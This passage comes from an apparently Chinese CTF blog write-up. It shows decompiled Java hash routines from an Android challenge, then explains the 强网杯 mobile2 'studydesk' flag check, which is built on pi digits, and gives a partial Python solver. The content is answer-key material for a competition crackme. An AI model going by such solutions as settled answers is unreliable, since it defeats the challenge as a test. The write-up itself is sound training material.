class="number">5</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">6</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">7</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span>: &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v1 = argRndKey &amp; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span>(v1 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_11 = MessageDigest.getInstance(<span class="string">&quot;MD2&quot;</span>);</span><br><span class="line">                    v1_11.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_13 = v1_11.digest();</span><br><span class="line">                    <span class="keyword">char</span>[] v1_12 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                    <span class="keyword">char</span>[] v2_1 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_13.length * <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">int</span> v3_5 = v0_13.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_5 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> v5_1 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span>(v4_5 &lt; v3_5) &#123;</span><br><span class="line">                        <span class="keyword">int</span> v6_1 = v0_13[v4_5];</span><br><span class="line">                        <span class="keyword">int</span> v8_1 = v5_1 + <span class="number">1</span>;</span><br><span class="line">                        v2_1[v5_1] = v1_12[v6_1 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                        v5_1 = v8_1 + <span class="number">1</span>;</span><br><span class="line">                        v2_1[v8_1] = v1_12[v6_1 &amp; <span class="number">15</span>];</span><br><span class="line">                        ++v4_5;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = <span class="keyword">new</span> String(v2_1);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_12) &#123;</span><br><span class="line">                    v0_12.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_9 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                    v1_9.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_11 = v1_9.digest();</span><br><span class="line">                    <span class="keyword">char</span>[] v1_10 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                    <span class="keyword">char</span>[] v2 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_11.length * <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">int</span> v3_4 = v0_11.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_4 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span>(v4_4 &lt; v3_4) &#123;</span><br><span class="line">                        <span class="keyword">int</span> v6 = v0_11[v4_4];</span><br><span class="line">                        <span class="keyword">int</span> v8 = v5 + <span class="number">1</span>;</span><br><span class="line">                        v2[v5] = v1_10[v6 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                        v5 = v8 + <span class="number">1</span>;</span><br><span class="line">                        v2[v8] = v1_10[v6 &amp; <span class="number">15</span>];</span><br><span class="line">                        ++v4_4;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = <span class="keyword">new</span> String(v2);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_10) &#123;</span><br><span class="line">                    v0_10.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_7 = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">                    v1_7.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_9 = v1_7.digest();</span><br><span class="line">                    StringBuilder v1_8 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_3 = v0_9.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_3;</span><br><span class="line">                    <span class="keyword">for</span>(v4_3 = <span class="number">0</span>; v4_3 &lt; v3_3; ++v4_3) &#123;</span><br><span class="line">                        v1_8.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_9[v4_3])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_8.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_8) &#123;</span><br><span class="line">                    v0_8.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_5 = MessageDigest.getInstance(<span class="string">&quot;SHA-224&quot;</span>);</span><br><span class="line">                    v1_5.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_7 = v1_5.digest();</span><br><span class="line">                    StringBuilder v1_6 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_2 = v0_7.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_2;</span><br><span class="line">                    <span class="keyword">for</span>(v4_2 = <span class="number">0</span>; v4_2 &lt; v3_2; ++v4_2) &#123;</span><br><span class="line">                        v1_6.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_7[v4_2])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_6.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_6) &#123;</span><br><span class="line">                    v0_6.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    MessageDigest v1_3 = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">                    v1_3.update(argBytes1);</span><br><span class="line">                    <span class="keyword">byte</span>[] v0_5 = v1_3.digest();</span><br><span class="line">                    StringBuilder v1_4 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">int</span> v3_1 = v0_5.length;</span><br><span class="line">                    <span class="keyword">int</span> v4_1;</span><br><span class="line">                    <span class="keyword">for</span>(v4_1 = <span class="number">0</span>; v4_1 &lt; v3_1; ++v4_1) &#123;</span><br><span class="line">                        v1_4.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_5[v4_1])));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v0_1 = v1_4.toString();</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(NoSuchAlgorithmException v0_4) &#123;</span><br><span class="line">                    v0_4.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">5</span> &amp;&amp; argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_1 = MessageDigest.getInstance(<span class="string">&quot;SHA-384&quot;</span>);</span><br><span class="line">                v1_1.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_3 = v1_1.digest();</span><br><span class="line">                StringBuilder v1_2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3 = v0_3.length;</span><br><span class="line">                <span class="keyword">int</span> v4;</span><br><span class="line">                <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3; ++v4) &#123;</span><br><span class="line">                    v1_2.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_3[v4])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_2.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_2) &#123;</span><br><span class="line">                v0_2.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">SHA512_int_String_add0</span><span class="params">(<span class="keyword">byte</span>[] arg2, <span class="keyword">byte</span>[] arg3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(arg3, <span class="string">&quot;HmacSha512&quot;</span>);</span><br><span class="line">            Mac v3 = Mac.getInstance(<span class="string">&quot;HmacSha512&quot;</span>);</span><br><span class="line">            v3.init(v1);</span><br><span class="line">            v3.update(arg2);</span><br><span class="line">            String v2_1;  <span class="comment">// hash -&gt; BigInteger -&gt; String</span></span><br><span class="line">            <span class="keyword">for</span>(v2_1 = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, v3.doFinal()).toString(<span class="number">16</span>); v2_1.length() &lt; <span class="number">32</span>; v2_1 = <span class="string">&quot;0&quot;</span> + v2_1) &#123;  <span class="comment">// hash -&gt; BigInteger -&gt; String</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> v2_1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException | InvalidKeyException v2) &#123;</span><br><span class="line">            v2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hex2Bytes(String arg6) &#123;</span><br><span class="line">        <span class="keyword">int</span> lens = arg6.length();</span><br><span class="line">        <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[lens / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; lens) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = Character.digit(arg6.charAt(ind), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">int</span> v4 = Character.digit(arg6.charAt(ind + <span class="number">1</span>), <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span>(v3 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                v1[ind / <span class="number">2</span>] = (<span class="keyword">byte</span>)(v3 + v4);</span><br><span class="line">                ind += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/Snipaste_2021-00-52-201.png" alt="Snipaste_2021-00-52-201" style="zoom:33%;" /></li></ol><h1 id="mimic-xctf-studydesk"><a href="#mimic-xctf-studydesk" class="headerlink" title="mimic-xctf-studydesk"></a>mimic-xctf-studydesk</h1><blockquote><p>强网杯 “拟态”比赛 mobile2</p></blockquote><p>当时做完了mobile1比较晚了，就没怎么细看这个题，没想到挺简单的。</p><p>flag要求长度为32，也就是32个byte，然后进行了一系列的处理。<br>引入了一个静态byte数组staticBytes，长度为288。对于其中的每个byte，去flag中查找下标，即<code>ind=flag.index(staticBytes[i])</code>。<br>因为flag本身长度为32，所以0&lt;ind&lt;32，所以保存为5bit，总共得到1440bit。<br>然后分割得到180个byte，记作<code>byteArray</code>，并将其与目标数组<code>aimBytes</code>比较。</p><p><code>aimBytes</code>的生成比较烧脑，但还好它是输入无关的。<br>把代码copy出来跑一遍，可以发现生成的是圆周率3.1415926……<br>把pi值转换成string，去掉小数点，每相邻两个数字处理为一个byte，得到<code>aimBytes</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">BigDecimal v2_1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">BigDecimal v3_1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">BigDecimal v4_2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;6&quot;</span>);</span><br><span class="line">MathContext MathCtx1 = <span class="keyword">new</span> MathContext(<span class="number">360</span>, RoundingMode.HALF_UP);  <span class="comment">// (digits, roundingMode)</span></span><br><span class="line">MathContext MathCtx2 = <span class="keyword">new</span> MathContext(<span class="number">720</span>, RoundingMode.HALF_UP);</span><br><span class="line"><span class="keyword">int</span> inds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">    v2_1 = a.a(<span class="keyword">new</span> BigDecimal(<span class="string">&quot;2&quot;</span>).subtract(a.a(<span class="keyword">new</span> BigDecimal(<span class="number">4</span>).subtract(v2_1.multiply(v2_1, MathCtx2), MathCtx2), MathCtx2)), MathCtx2);</span><br><span class="line">    v4_2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;2&quot;</span>).multiply(v4_2, MathCtx1);</span><br><span class="line">    v10 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0.5&quot;</span>).multiply(v2_1.multiply(v4_2, MathCtx1), MathCtx1);</span><br><span class="line">    <span class="keyword">if</span>(v10.compareTo(v3_1) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ++inds;</span><br><span class="line">    <span class="keyword">if</span>(inds % <span class="number">30</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        StringBuilder v3_2 = b.a.a.a.a.e(<span class="string">&quot;running: &quot;</span>);</span><br><span class="line">        v3_2.append(inds / <span class="number">6</span>);</span><br><span class="line">        v3_2.append(<span class="string">&quot;%&quot;</span>);</span><br><span class="line">        Log.i(<span class="string">&quot;StudyDesk:&quot;</span>, v3_2.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v3_1 = v10;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Log.i(<span class="string">&quot;StudyDesk:&quot;</span>, <span class="string">&quot;running: 100%&quot;</span>);</span><br><span class="line">String aimString = v10.toString().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>解密代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pi = <span class="string">&quot;314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036&quot;</span></span><br><span class="line">aimBytes = []</span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pi), <span class="number">2</span>):</span><br><span class="line">    aimBytes.append(<span class="built_in">int</span>(pi[ind:ind+<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">staticBytes = [<span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">43</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">45</span>, <span class="number">0x30</span>, <span class="number">36</span>, <span class="number">84</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">66</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">84</span>, <span class="number">0x79</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">0x6F</span>, <span class="number">51</span>, <span class="number">66</span>, <span class="number">89</span>, <span class="number">49</span>, <span class="number">69</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">0x74</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">98</span>, <span class="number">0x72</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">98</span>, <span class="number">50</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">107</span>, <span class="number">66</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">66</span>, <span class="number">50</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">0x5F</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x79</span>, <span class="number">0x5F</span>, <span class="number">0x40</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">50</span>, <span class="number">0x40</span>, <span class="number">85</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">43</span>, <span class="number">36</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x40</span>, <span class="number">49</span>, <span class="number">0x72</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">0x40</span>, <span class="number">0x79</span>, <span class="number">53</span>, <span class="number">36</span>, <span class="number">0x40</span>, <span class="number">69</span>, <span class="number">89</span>, <span class="number">98</span>, <span class="number">45</span>, <span class="number">0x6F</span>, <span class="number">101</span>, <span class="number">36</span>, <span class="number">97</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">97</span>, <span class="number">0x30</span>, <span class="number">36</span>, <span class="number">0x6F</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">0x5F</span>, <span class="number">49</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">89</span>, <span class="number">0x74</span>, <span class="number">85</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x73</span>, <span class="number">89</span>, <span class="number">43</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">0x72</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">38</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">51</span>, <span class="number">98</span>, <span class="number">0x75</span>, <span class="number">0x5F</span>, <span class="number">50</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">84</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">0x6F</span>, <span class="number">100</span>, <span class="number">0x30</span>, <span class="number">0x6F</span>, <span class="number">98</span>, <span class="number">89</span>, <span class="number">0x72</span>, <span class="number">0x40</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">0x72</span>, <span class="number">51</span>, <span class="number">84</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">0x40</span>, <span class="number">0x30</span>, <span class="number">53</span>, <span class="number">51</span>, <span class="number">0x30</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">0x74</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">85</span>, <span class="number">97</span>, <span class="number">66</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">43</span>, <span class="number">100</span>, <span class="number">89</span>, <span class="number">45</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x40</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">101</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">0x5F</span>, <span class="number">51</span>, <span class="number">82</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">61</span>, <span class="number">101</span>, <span class="number">0x40</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">0x5F</span>, <span class="number">66</span>, <span class="number">0x74</span>, <span class="number">49</span>, <span class="number">0x40</span>, <span class="number">87</span>, <span class="number">97</span>, <span class="number">43</span>, <span class="number">0x5F</span>, <span class="number">0x73</span>, <span class="number">43</span>, <span class="number">0x30</span>, <span class="number">89</span>, <span class="number">45</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">33</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">85</span>, <span class="number">0x30</span>, <span class="number">98</span>, <span class="number">98</span>, <span class="number">0x5F</span>, <span class="number">50</span>, <span class="number">107</span>, <span class="number">66</span>, <span class="number">101</span>, <span class="number">0x6F</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">0x75</span>, <span class="number">51</span>, <span class="number">0x74</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">0x40</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">69</span>, <span class="number">0x40</span>, <span class="number">73</span>, <span class="number">0x5F</span>, <span class="number">0x30</span>, <span class="number">85</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">97</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit8</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flagTable = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">sb_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">180</span>, <span class="number">5</span>):</span><br><span class="line">    binString = bit8(aimBytes[ind])+bit8(aimBytes[ind+<span class="number">1</span>])+bit8(aimBytes[ind+<span class="number">2</span>])+bit8(aimBytes[ind+<span class="number">3</span>])+bit8(aimBytes[ind+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">for</span> indd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binString), <span class="number">5</span>):</span><br><span class="line">        index = <span class="built_in">int</span>(binString[indd:indd+<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        